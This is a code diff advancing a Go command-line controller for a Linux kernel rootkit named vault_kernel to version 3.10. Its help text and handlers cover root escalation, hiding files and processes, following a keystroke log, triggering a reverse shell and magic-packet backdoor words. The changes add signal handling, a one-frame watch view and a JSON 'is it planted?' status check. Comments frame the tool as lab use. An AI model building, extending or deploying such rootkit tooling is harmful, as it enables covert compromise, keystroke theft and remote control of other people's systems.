@@ -5,16 +5,18 @@ import (
 	"encoding/json"
 	"fmt"
 	"os"
+	"os/exec"
 	"os/signal"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
 	"unsafe"
 
 	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
 )
 
-const clientVersion = "3.9"
+const clientVersion = "3.10"
 
 // Poll interval contract of `keylog --follow` (milliseconds), mirrored
 // by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
@@ -362,7 +364,8 @@ type keylogOpts struct {
 // missing operand or an empty path is a usage error, same strictness as
 // the positional interval).  Extracted as a pure function so the grammar
 // is unit-testable without a device (v3.8 — before, any arg that was not
-// `--follow` was silently ignored in the one-shot path).
+// `--follow` was silently ignored in the one-shot path).  v3.10 adds the
+// flag-value rule: a FILE operand starting with '-' is rejected.
 func parseKeylogArgs(args []string) (keylogOpts, error) {
 	opts := keylogOpts{intervalMs: keylogDefaultIntervalMs}
 	seenInterval := false
@@ -381,8 +384,12 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 			}
 			i++
 			opts.outputPath = args[i]
-			if opts.outputPath == "" {
-				return opts, fmt.Errorf("--output requires a FILE operand")
+			if opts.outputPath == "" || strings.HasPrefix(opts.outputPath, "-") {
+				// v3.10: a flag-like token is a MISSING operand, never a
+				// file called "--follow" (parity with argparse, which
+				// rejects the same input with "expected one argument").
+				// A real path starting with '-' needs the ./- escape.
+				return opts, fmt.Errorf("--output requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", opts.outputPath)
 			}
 		default:
 			if !opts.follow || seenInterval {
@@ -407,8 +414,9 @@ func parseKeylogArgs(args []string) (keylogOpts, error) {
 //	capture [--out FILE]
 //
 // Strict like the rest of the v3.8/v3.9 grammars: --out takes exactly
-// one FILE operand and may appear at most once; any other token is a
-// usage error. Without --out the bundle goes to stdout.
+// one FILE operand and may appear at most once (v3.10: a FILE operand
+// starting with '-' is rejected); any other token is a usage error.
+// Without --out the bundle goes to stdout.
 func parseCaptureArgs(args []string) (string, error) {
 	outPath := ""
 	for i := 0; i < len(args); i++ {
@@ -422,8 +430,10 @@ func parseCaptureArgs(args []string) (string, error) {
 			}
 			i++
 			outPath = args[i]
-			if outPath == "" {
-				return "", fmt.Errorf("--out requires a FILE operand")
+			if outPath == "" || strings.HasPrefix(outPath, "-") {
+				// v3.10: same flag-value rule as --output — `capture
+				// --out --json` used to eat --json as the path.
+				return "", fmt.Errorf("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
 			}
 		default:
 			return "", fmt.Errorf("usage: vault_kernel capture [--out FILE]")
@@ -482,7 +492,9 @@ func (s *keylogSink) close() {
 // With outputPath (v3.9) every emitted event is ALSO appended to the
 // file and flushed — the exact bytes printed to the terminal, so the
 // file is a faithful transcript (timestamps included when active).
-// Exits on Ctrl-C (default SIGINT handling).
+// Since v3.10 BOTH Ctrl-C and SIGTERM stop the loop cleanly with a
+// farewell line (parity with the Python client, which always had the
+// message): systemd/pkill -TERM no longer cut the stream mid-write.
 func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string) error {
 	var sink *keylogSink
 	if outputPath != "" {
@@ -495,6 +507,11 @@ func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string
 		fmt.Printf("[*] Recording to %s\n", outputPath)
 	}
 	fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
+
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
+	defer signal.Stop(sig)
+
 	prev := ""
 	for {
 		buf := make([]byte, 4096)
@@ -519,17 +536,29 @@ func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string
 			}
 			prev = cur
 		}
-		time.Sleep(time.Duration(intervalMs) * time.Millisecond)
+		select {
+		case <-sig:
+			fmt.Println("\n[*] Follow stopped")
+			return nil
+		case <-time.After(time.Duration(intervalMs) * time.Millisecond):
+		}
 	}
 }
 
 // runWatch drives the `watch` command: clear the screen and repaint
-// stats + hidden list every intervalMs until Ctrl-C. Rendering itself
-// lives in ioctl.RenderWatchPanel (pure, unit-tested); this function
-// only owns the refresh loop and console cursor restoration.
-func runWatch(f *os.File, intervalMs int) error {
+// stats + hidden list every intervalMs until Ctrl-C or SIGTERM (both
+// stop cleanly since v3.10). Rendering itself lives in
+// ioctl.RenderWatchPanelDiff (pure, unit-tested); this function only
+// owns the refresh loop, the prev-stats threading that powers the
+// change annotations, and console cursor restoration. With Once it
+// delegates to watchOnce (single frame, no ANSI control sequences).
+func runWatch(f *os.File, opts watchOpts) error {
+	if opts.once {
+		return watchOnce(f, opts.intervalMs)
+	}
+
 	sig := make(chan os.Signal, 1)
-	signal.Notify(sig, os.Interrupt)
+	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
 	defer signal.Stop(sig)
 
 	// Hide the cursor for the repaint loop; ALWAYS restore it on exit.
@@ -538,31 +567,60 @@ func runWatch(f *os.File, intervalMs int) error {
 
 	statsBuf := make([]byte, 4096)
 	listBuf := make([]byte, 4096)
+	var prevStats map[string]string
 	for {
-		_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0]))
-		if err != 0 {
+		stats, panel, err := watchFrame(f, statsBuf, listBuf, prevStats, opts.intervalMs)
+		if err != nil {
 			return err
 		}
-		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
-			return err
-		}
-		panel := ioctl.RenderWatchPanel(
-			ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00")),
-			ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
-			intervalMs,
-			time.Now().Format("15:04:05"),
-		)
 		// ANSI: clear screen + home cursor, then the frame.
 		fmt.Print("\x1b[2J\x1b[H")
 		fmt.Print(panel)
+		prevStats = stats
 
 		select {
 		case <-sig:
 			fmt.Println("[*] watch stopped")
 			return nil
-		case <-time.After(time.Duration(intervalMs) * time.Millisecond):
+		case <-time.After(time.Duration(opts.intervalMs) * time.Millisecond):
 		}
 	}
+}
+
+// watchOnce renders a single watch frame to stdout WITHOUT any ANSI
+// control sequences — the `watch --once` snapshot (v3.10) for scripts,
+// CI diagnostics and reports: the panel lands in the scrollback like
+// any other command output and the exit code reflects the ioctls.
+func watchOnce(f *os.File, intervalMs int) error {
+	stats, panel, err := watchFrame(f, make([]byte, 4096), make([]byte, 4096), nil, intervalMs)
+	if err != nil {
+		return err
+	}
+	_ = stats
+	fmt.Print(panel)
+	return nil
+}
+
+// watchFrame performs one GET_STATS + LIST_HIDDEN round and renders
+// the panel. prevStats (nil on the first frame / in --once) enables
+// the change annotations of RenderWatchPanelDiff; the parsed stats
+// return value feeds the next iteration's prev.
+func watchFrame(f *os.File, statsBuf, listBuf []byte, prevStats map[string]string, intervalMs int) (map[string]string, string, error) {
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0])); err != 0 {
+		return nil, "", err
+	}
+	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
+		return nil, "", err
+	}
+	stats := ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00"))
+	panel := ioctl.RenderWatchPanelDiff(
+		stats,
+		prevStats,
+		ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
+		intervalMs,
+		time.Now().Format("15:04:05"),
+	)
+	return stats, panel, nil
 }
 
 func keylogClear(f *os.File) error {
@@ -999,6 +1057,126 @@ func runDoctor(jsonMode bool) error {
 	return nil
 }
 
+// modinfoInfo is the optional `modinfo` section of the status
+// document. Field order is contractual (docs/schemas/status.md); an
+// absent field is omitted from the JSON (omitempty).
+type modinfoInfo struct {
+	Filename    string `json:"filename,omitempty"`
+	Version     string `json:"version,omitempty"`
+	Author      string `json:"author,omitempty"`
+	Description string `json:"description,omitempty"`
+}
+
+// statusReport is the FIFTH machine-readable document (v3.10): the
+// "is it planted?" check as JSON, usable WITHOUT root — status never
+// opens the device. modinfo is best-effort and only present when the
+// device exists and `modinfo vault_kernel` ran successfully.
+type statusReport struct {
+	Schema        int          `json:"schema"`
+	DevicePresent bool         `json:"device_present"`
+	ModuleInSysfs bool         `json:"module_in_sysfs"`
+	Modinfo       *modinfoInfo `json:"modinfo,omitempty"`
+}
+
+// parseModinfo extracts the contract keys from `modinfo vault_kernel`
+// output: exact key match at line start (first occurrence wins,
+// case-insensitive — modinfo emits lowercase keys), empty values
+// skipped. Returns nil when NONE of the contract keys appeared —
+// callers then omit the section entirely. Pure and unit-testable.
+func parseModinfo(output string) *modinfoInfo {
+	var mi modinfoInfo
+	seen := map[string]bool{}
+	for _, line := range strings.Split(output, "\n") {
+		key, value, found := strings.Cut(line, ":")
+		if !found {
+			continue
+		}
+		k := strings.ToLower(strings.TrimSpace(key))
+		v := strings.TrimSpace(value)
+		if seen[k] || v == "" {
+			continue
+		}
+		switch k {
+		case "filename":
+			mi.Filename = v
+		case "version":
+			mi.Version = v
+		case "author":
+			mi.Author = v
+		case "description":
+			mi.Description = v
+		default:
+			continue
+		}
+		seen[k] = true
+	}
+	if !seen["filename"] && !seen["version"] && !seen["author"] && !seen["description"] {
+		return nil
+	}
+	return &mi
+}
+
+// buildStatusReport assembles the status document from already-collected
+// facts — pure, so the envelope is unit-testable without a device (v3.10).
+func buildStatusReport(devicePresent, moduleInSysfs bool, mi *modinfoInfo) statusReport {
+	return statusReport{
+		Schema:        jsonSchemaVersion,
+		DevicePresent: devicePresent,
+		ModuleInSysfs: moduleInSysfs,
+		Modinfo:       mi,
+	}
+}
+
+// runStatus implements the `status` command (text or JSON). It never
+// opens the device: a lab script can probe the implant's presence
+// without root. The modinfo section is best-effort — skipped when
+// modinfo is missing, fails, or the module is not loaded.
+func runStatus(jsonMode bool) error {
+	devicePresent := false
+	if _, err := os.Stat(devicePath); err == nil {
+		devicePresent = true
+	}
+	_, sysfsErr := os.Stat(sysfsModulePath)
+
+	var mi *modinfoInfo
+	if devicePresent {
+		if out, err := exec.Command("modinfo", "vault_kernel").Output(); err == nil {
+			mi = parseModinfo(string(out))
+		}
+	}
+
+	if jsonMode {
+		j, err := json.MarshalIndent(buildStatusReport(devicePresent, sysfsErr == nil, mi), "", "  ")
+		if err != nil {
+			return err
+		}
+		fmt.Println(string(j))
+		return nil
+	}
+
+	if devicePresent {
+		fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
+		// v3.10: modinfo lines match the Python client's status output
+		// (exact keys, fixed order — the old substring scan printed
+		// srcversion too).
+		if mi != nil {
+			if mi.Version != "" {
+				fmt.Printf("    version: %s\n", mi.Version)
+			}
+			if mi.Author != "" {
+				fmt.Printf("    author: %s\n", mi.Author)
+			}
+			if mi.Description != "" {
+				fmt.Printf("    description: %s\n", mi.Description)
+			}
+		}
+	} else {
+		fmt.Println("[*] vault_kernel kernel module is NOT loaded")
+		fmt.Println("    Run: sudo insmod vault_kernel.ko")
+	}
+	return nil
+}
+
 // parsePIDArgs combines the strict one-operand grammar with
 // parsePIDArg for hide-pid/unhide-pid (pure; unit-testable).
 func parsePIDArgs(args []string, cmd string) (int, error) {
@@ -1022,30 +1200,37 @@ func parsePortArgs(args []string, cmd string) (uint16, error) {
 // watchOpts is the parsed argument set of the `watch` command.
 type watchOpts struct {
 	intervalMs int
+	once       bool
 }
 
-// parseWatchArgs owns the `watch` grammar (v3.9, pure):
+// parseWatchArgs owns the `watch` grammar (v3.9, extended in v3.10
+// with --once; pure):
 //
-//	watch [--interval MS]
+//	watch [--interval MS] [--once]
 //
 // Default 1000 ms, --interval takes a required operand (>= 50 ms,
 // same floor as keylog), and ANY extra argument is a usage error —
 // `watch --interval 500 extra` used to ignore "extra" in silence.
+// --once renders a single frame and exits (no ANSI control, no loop).
 func parseWatchArgs(args []string) (watchOpts, error) {
 	opts := watchOpts{intervalMs: watchDefaultIntervalMs}
 	for i := 0; i < len(args); i++ {
-		if args[i] != "--interval" {
-			return opts, fmt.Errorf("usage: vault_kernel watch [--interval MS]")
+		switch args[i] {
+		case "--once":
+			opts.once = true
+		case "--interval":
+			if i+1 >= len(args) {
+				return opts, fmt.Errorf("--interval requires an MS operand")
+			}
+			i++
+			n, err := strconv.Atoi(args[i])
+			if err != nil || n < keylogMinIntervalMs {
+				return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
+			}
+			opts.intervalMs = n
+		default:
+			return opts, fmt.Errorf("usage: vault_kernel watch [--interval MS] [--once]")
 		}
-		if i+1 >= len(args) {
-			return opts, fmt.Errorf("--interval requires an MS operand")
-		}
-		i++
-		n, err := strconv.Atoi(args[i])
-		if err != nil || n < keylogMinIntervalMs {
-			return opts, fmt.Errorf("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
-		}
-		opts.intervalMs = n
 	}
 	return opts, nil
 }
@@ -1077,7 +1262,7 @@ Usage:
   vault_kernel <command> [arguments]
 
 Commands:
-  status                  Check if rootkit is loaded
+  status [--json]         Check if rootkit is loaded (JSON for scripts)
   doctor [--json]         Diagnose module/client state (lab sanity check)
   give-root [pid]         Escalate process to root (default: self)
   hide-file <name>        Hide a file/directory
@@ -1089,7 +1274,9 @@ Commands:
   list [--json]           List all hidden items
   stats                   Show module stats (version, hooks, counts)
   stats --json            Same, as machine-readable JSON
-  watch [--interval MS]   Live view of stats + hidden list (default 1000 ms)
+  watch [--interval MS] [--once]
+                          Live view of stats + hidden list (default 1000 ms);
+                          --once renders a single frame and exits
   shell <ip:port>         Trigger reverse shell
   magic <word>            Set magic packet trigger word
   magic-encode <word> <port>  Print the kill() trigger for a word+port
@@ -1111,17 +1298,13 @@ func run() error {
 	}
 
 	if os.Args[1] == "status" {
-		// v3.9 strict grammar: `status extra` was silently tolerated.
-		if err := strictArgs(os.Args[2:], 0, "usage: vault_kernel status"); err != nil {
+		// v3.10: --json joins the machine-readable surface (5th JSON
+		// document); the strict grammar is kept via parseFlagOnly.
+		jsonMode, err := parseFlagOnly(os.Args[2:], "--json", "usage: vault_kernel status [--json]")
+		if err != nil {
 			return err
 		}
-		if _, err := os.Stat(devicePath); err == nil {
-			fmt.Printf("[*] vault_kernel kernel module is LOADED\n    Device: %s\n", devicePath)
-		} else {
-			fmt.Println("[*] vault_kernel kernel module is NOT loaded")
-			fmt.Println("    Run: sudo insmod vault_kernel.ko")
-		}
-		return nil
+		return runStatus(jsonMode)
 	}
 
 	if os.Args[1] == "-h" || os.Args[1] == "--help" || os.Args[1] == "help" {
@@ -1244,7 +1427,7 @@ func run() error {
 		if err != nil {
 			return err
 		}
-		return runWatch(f, opts.intervalMs)
+		return runWatch(f, opts)
 
 	case "shell":
 		// v3.9: real ip:port validation (host non-empty, port 1-65535)
@@ -1262,10 +1445,6 @@ func run() error {
 			return err
 		}
 		return backdoorMagic(f, os.Args[2])
-
-	case "version":
-		printVersion()
-		return nil
 
 	case "keylog":
 		opts, err := parseKeylogArgs(os.Args[2:])
